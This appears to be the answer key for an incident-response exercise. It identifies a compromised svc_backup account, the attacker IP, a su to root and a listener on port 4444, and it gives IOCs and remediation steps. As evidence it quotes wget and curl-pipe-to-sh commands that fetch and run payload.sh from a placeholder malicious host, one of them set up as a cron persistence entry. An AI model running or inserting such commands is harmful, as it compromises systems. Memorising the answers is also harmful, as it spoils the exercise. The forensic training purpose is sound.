# ANSWERS.md

**1) Compromised account**
svc_backup. 

**2) Attacker IP(s)**
198.51.100.23. 

**3) Initial access evidence (exact log lines / commands)**
`Oct 24 20:30:30 webserver-01 sshd[2999]: Accepted password for svc_backup from 198.51.100.23 port 42318 ssh2` 

**4) Commands used to download / run payload (exact)**
`wget http://malicious.example/payload.sh -O /tmp/payload.sh`
`chmod +x /tmp/payload.sh && /tmp/payload.sh`
(Shown in syslog.) 

**5) Persistence mechanism added (exact cron line)**
`*/5 * * * * svc_backup /usr/bin/curl -s http://malicious.example/payload.sh | sh` (written to `/var/spool/cron/crontabs/svc_backup`). 

**6) Evidence of privilege escalation / lateral action (exact)**
`Oct 24 20:35:00 webserver-01 su: pam_unix(su:session): session opened for user root by svc_backup(uid=1001)` 

**7) Payload behavior observed (exact / key lines)**
`/tmp/payload.sh: line 1: python: command not found`
`/tmp/payload.sh: executing additional installer`
`/tmp/payload.sh: starting background listener` (kernel/netfilter TCP entries showing connection to DST=10.0.0.5 DPT=4444).

**8) Timeline (short; timestamps only)**

* 20:30:30 — SSH accepted for svc_backup. 
* 20:35:12 — `wget ... /tmp/payload.sh`. 
* 20:35:18 — `chmod +x /tmp/payload.sh && /tmp/payload.sh`. 
* 20:35:40 — cron entry written for persistence. 

**9) IOCs (short list)**

* IP: `198.51.100.23`. 
* URL/domain: `malicious.example` ([http://malicious.example/payload.sh](http://malicious.example/payload.sh)). 
* Files: `/tmp/payload.sh`. 
* Cron entry: `*/5 * * * * svc_backup /usr/bin/curl -s http://malicious.example/payload.sh | sh`. 

**10) One-line remediation actions **

* Remove cron entry. 
* Remove `/tmp/payload.sh` and any related files. 
* Disable `svc_backup` account and rotate credentials. 
* Block `198.51.100.23` and `malicious.example` at network perimeter.

---

End of answers.
